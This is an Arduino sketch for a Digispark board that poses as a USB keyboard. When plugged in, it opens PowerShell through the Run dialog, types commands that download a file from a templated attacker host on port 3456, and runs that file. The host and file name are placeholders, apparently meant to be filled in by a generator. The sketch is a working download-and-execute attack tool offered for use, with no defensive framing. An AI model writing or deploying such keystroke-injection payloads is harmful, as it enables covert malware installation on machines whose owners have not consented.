
/****************************************************************
 *								*
 *          Created by Sharon Shaju				*
 *          Follow me on Instagram				*
 *                https://www.instagram.com/zero.overflow	*
 *          My GitHub						*
 *                https://www.github.com/zer0overflow		*
 *								*
 ****************************************************************/		

#include "DigiKeyboard.h"

void setup() {
	  pinMode(1, OUTPUT);
	  DigiKeyboard.delay(1000);
	  DigiKeyboard.sendKeyStroke( KEY_R,MOD_GUI_LEFT);
	  DigiKeyboard.delay(500);
	  DigiKeyboard.println("powershell");
	  DigiKeyboard.delay(500);
	  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
	  DigiKeyboard.println("$WebClient = New-Object System.Net.WebClient");
	  DigiKeyboard.println("$WebClient.DownloadFile(\"http://{host}:3456/{mal}\",\"{mal}\")");
	  DigiKeyboard.delay(1000);
	  DigiKeyboard.println("start {mal}");
	  DigiKeyboard.println("exit");
	  digitalWrite(1, HIGH);
}

void loop() {
	  // Led starts to blink to indicate that execution is over
	  digitalWrite(1, HIGH);
	  digitalWrite(0, LOW);
	  delay(100);
	  digitalWrite(1, LOW);
	  digitalWrite(0,HIGH);
	  delay(100);
}
